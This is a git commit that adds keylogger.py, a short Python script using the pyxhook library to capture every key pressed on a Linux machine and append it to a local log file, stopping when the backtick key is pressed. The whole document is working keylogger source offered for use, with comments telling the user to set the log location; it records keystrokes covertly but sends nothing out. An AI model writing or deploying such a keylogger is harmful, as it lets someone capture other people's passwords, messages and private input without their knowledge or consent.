d8789b29e08253f8bd5139a4c878907366f823ee
cycxtIT <90236905+cycxtIT@users.noreply.github.com>
2021-09-09 13:02:53 +0800

    Create keylogger.py

---
+++ keylogger.py
@@ -0,0 +1,31 @@
+import pyxhook
+ 
+#This tells the keylogger where the log will go. Change it to direct to where you want it.
+ 
+log_file='/home/linux/file.log'
+ 
+#The file will automatically appear on the desktop. You may want to edit the location!
+ 
+def OnKeyPress(event):
+ 
+  fob=open(log_file,'a')
+ 
+  fob.write(event.Key)
+ 
+  fob.write('\n')
+ 
+ 
+ 
+  if event.Ascii==96: 
+ 
+    fob.close()
+ 
+    new_hook.cancel()
+ 
+new_hook=pyxhook.HookManager()
+ 
+new_hook.KeyDown=OnKeyPress
+ 
+new_hook.HookKeyboard()
+ 
+new_hook.start()
